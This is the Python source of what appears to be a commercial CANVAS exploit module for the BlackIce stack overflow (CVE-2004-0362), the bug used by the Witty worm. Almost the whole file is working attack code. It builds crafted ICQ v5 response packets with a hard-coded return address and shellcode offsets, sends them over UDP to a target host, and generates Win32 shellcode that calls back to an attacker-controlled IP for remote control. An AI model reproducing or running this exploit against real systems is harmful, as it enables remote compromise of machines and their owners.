#! /usr/bin/env python

#
# CANVAS blackice Exploit
#

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
sys.path.append(".")
sys.path.append("../../")
sys.path.append('../../encoder')
sys.path.append('./encoder')
sys.path.append("../../shellcode")
sys.path.append("./shellcode")
sys.path.append("../../gui")
sys.path.append("./gui")


import os,getopt
import socket
from exploitutils import *
import addencoder
import win32shell
from tcpexploit import tcpexploit
import canvasengine
from canvasengine import socket_save_list
import time
import shellcodeGenerator
import chunkedaddencoder

NAME="BlackIce Stack Overflow"
DESCRIPTION="BlackIce stack overflow"

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="ISS"
DOCUMENTATION["Notes"]="This is the exploit that the Witty worm used. Try it a couple times if it doens't work initially."
DOCUMENTATION["Repeatability"]="This is a one shot exploit."
DOCUMENTATION["CVE Name"] = "CVE-2004-0362"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-0362"
DOCUMENTATION['CVSS'] = 7.5

VERSION="1.0"
GTK2_DIALOG="dialog.glade2"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000"]

NOTES="""
Commandline Usage:
exploits/blackice/blackice.py -v 1 -t targethost -l callback_ip -d 5555


Attach to blackd, not blackice.exe
5e0626d6 

The structure is on the stack as well
at 5e06268f you see the call that fills the structure in.
First word is the UIN
Second word is IP?
"""

CHANGELOG="""

"""


runAnExploit_gtk2=canvasengine.runAnExploit_gtk2
runExploit=canvasengine.runExploit


ICQVER=5
SRV_MULTI=0x0212
SRV_USER_ONLINE=0x006e
SRV_META_USER=0x03de
UIN=0x40
SESSION_NUMBER=0x41

def icqv5servermulti(bodies):
    
    ret=""
    ret+=halfword2istr(ICQVER)
    ret+="\x00" #pad
    ret+=big_order(0) #session number

    ret+=halfword2istr(SRV_MULTI) #command
    ret+=halfword2bstr(0) #seq1
    ret+=halfword2bstr(0) #seq2
    
    ret+=big_order(UIN) #UIN
    ret+=big_order(0) #checkcode
    #BODY STARTS
    numpackets=len(bodies)
    print "Number of packets: %d"%numpackets
    ret+=chr(numpackets)
    for packet in bodies:
        packetlen=len(packet)
        ret+=halfword2istr(packetlen) #unknown length?
        ret+=packet

    return ret

def icqv5serveruseronline():
    """
    Fills in first two words of the blackice structure
    """
    ret=""
    ret+=halfword2istr(ICQVER)
    ret+="\x00" #pad
    ret+=intel_order(SESSION_NUMBER) #session number

    ret+=halfword2istr(SRV_USER_ONLINE) #command
    ret+=halfword2bstr(0x12) #seq1
    ret+=halfword2bstr(0x11) #seq2
    
    ret+=intel_order(UIN) #UIN
    ret+=big_order(0x50) #checkcode
    ret+=intel_order(UIN) #uin
    ret+=intel_order(1111) #ip
    ret+=intel_order(2) #port
    ret+=intel_order(3) #realip
    ret+=intel_order(2) #status
    ret+=intel_order(1) #version
    ret+=intel_order(5) #version
    return ret

SRV_META_USER_SUBCMD=0x0000

def icqv5servermetauser(sploitstring):
    ret=""
    ret+=halfword2istr(ICQVER)
    ret+="\x00" #pad
    ret+=intel_order(SESSION_NUMBER) #session number

    ret+=halfword2istr(SRV_META_USER) #command
    ret+=halfword2bstr(0) #seq1
    ret+=halfword2bstr(0) #seq2
    
    ret+=intel_order(UIN) #UIN
    ret+=big_order(0) #checkcode
    #body...
    SRV_META_USER_DATA=0x0002
    SRV_META_USER_INFO=0x00c8
    SRV_META_USER_FOUND=0x019a
    SRV_META_USER_RESULT=0x0002
    META_EX_USER_FOUND=0x0190
    META_ABOUT=0x00e6
    
    if 0:
        ret+=halfword2istr(SRV_META_USER_FOUND) #command
        ret+="\x0a" #success
        ret+=intel_order(UIN) #uin
        #nick, first name, last name, email
        strs=["Q"*80,"B"*1000,"C"*1,"bob@bob.com"*1]
        for astr in strs:
            astr+="\x00" #null terminate it
            length=len(astr)
            ret+=halfword2istr(length)
            ret+=(astr)
    
        ret+="\x00" #no auth
        ret+=halfword2bstr(1) #x2
        ret+=big_order(0) #x3
    if 0:
        ret+=halfword2istr(META_EX_USER_FOUND)
        ret+="\x0a" #success
        ret+=halfword2istr(5000)
        ret+=intel_order(UIN) #uin
        #nick, first name, last name, email
        strs=["A"*8,"B"*10,"C"*10,"bob@bob.com"]
        for astr in strs:
            astr+="\x00" #null terminate it
            length=len(astr)
            ret+=halfword2istr(length)
            ret+=(astr)
    
        ret+="\x00" #no auth
        ret+=halfword2bstr(1) #x2
        ret+=big_order(0) #x3
    if 0:
        ret+=binstring("""00 0000 0100 0001 0000
        0100 001e 0220 2020 2020 2020 285e 2e5e
        2920 2020 2020 2069 6e73 6572 7420 7769
        7474 7920 6d65 7373 6167 6520 6865 7265
        2e20 2020 2020 2028 5e2e 5e29 2020 2020
        2020 2089 e78b 7f14 83c7 0881 c4e8 fdff""" )
        
    if 0:
        ret+=binstring("""00 00 00 00 00 
        00 00 00 00 00 00 00 00 00 00 01 00 00 01 00 00  
        01 00 00 1e 02 20 20 20 20 20 20 20 28 5e 2e 5e  
        29 20 20 20 20 20 20 69 6e 73 65 72 74 20 77 69  
        74 74 79 20 6d 65 73 73 61 67 65 20 68 65 72 65  
        2e 20 20 20 20 20 20 28 5e 2e 5e 29 20 20 20 20  
        20 20 20               """)
        ret+="A"*400
    if 1:
        ret+=halfword2istr(0x010f) #UNDOCUMENT ICQ OPCODE HERE (anything XX0X where X is anynthing is fine)
        ret+="\x0a" #success
        ret+=halfword2istr(5000)
        ret+=sploitstring+"\x00" #
        
    return ret


def icqv5server(sploitstring):
    bodies=[]
    bodies.append(icqv5serveruseronline())
    bodies.append(icqv5servermetauser(sploitstring))
    ret=icqv5servermulti(bodies)
    return ret


class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        
        self.port             = 400
        self.host             = ""
        self.shellcode        = "\xcc" * 298
        #hmm, according to 60074207 we only compare with 0, 0d 0a 3f 26 20
        #self.searchbadstring ="%.,:;\x00\x0a\x0d+\"\x2f\x5c\x09\x0e\x0b =&~("
        self.searchbadstring  = "%\x00\x0a\x0d&? 0"
        self.badstring        = self.searchbadstring
        self.ssl              = 0
        self.setVersions()
        self.version          = 1
        self.name             = NAME        

    def displayVersions(self):
        for v in self.versions.keys():
            print "Version %d: %s"%(v,self.versions[v][0])

    def setVersions(self):
        self.versions={}
        #name, jmp esp, writeloc, writable, shelloc
        self.versions[1]=("Win32: BlackIce PC version ccd (wormed)",None)


    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]
    
    def createShellcode(self):
        host=self.callback.ip
        port=self.callback.port
        return self.createWin32Shellcode(self.badstring,host,port)
    
    def run(self):
        
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            self.log("Automatic versioning not enabled.")
            self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
            return 0

        self.log("Attacking %s:%d"%(self.host,self.port))
        sploitstring=self.makesploit()
        try:
            #s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s=self.getudpsock()
            s.bind((self.callback.ip,4000))
            s.connect((self.host, self.port))
            self.log("Length attack string is %d"%len(sploitstring))
            s.send(sploitstring)
        except socket.error:
            failed=1
        #finish this up
        time.sleep(2)
        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
            return 1
        else:
            self.setInfo("%s attacking %s:%d - done (failed!)"%(NAME,self.host,self.port))
            return 0

        
    def makesploit(self):
        """
        Construct the attack
        We make our string small enough that we don't go over the segment boundry
        and cause an AV.
        
        """
        length=1300 #Hopefully this is big enough
        sploitstring="A"*length
        writable=0x7ffdf050
        retaddr=0x5e077663 #jmp esp in iss_pam1.text
        #retaddr=0x01020304
        retloc=528
        shellloc=retloc+20
        #CoE at 5e06270F in Win32 version
        sploitstring=stroverwrite(sploitstring,intel_order(writable),512-4)
        sploitstring=stroverwrite(sploitstring,intel_order(writable),512)
        sploitstring=stroverwrite(sploitstring,intel_order(writable),512+4)
        sploitstring=stroverwrite(sploitstring,intel_order(retaddr),retloc)
        sploitstring=stroverwrite(sploitstring,self.shellcode,shellloc)
        #now create a single ICQ Server Response packet with that in it
        ret=icqv5server(sploitstring) 
        return ret

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
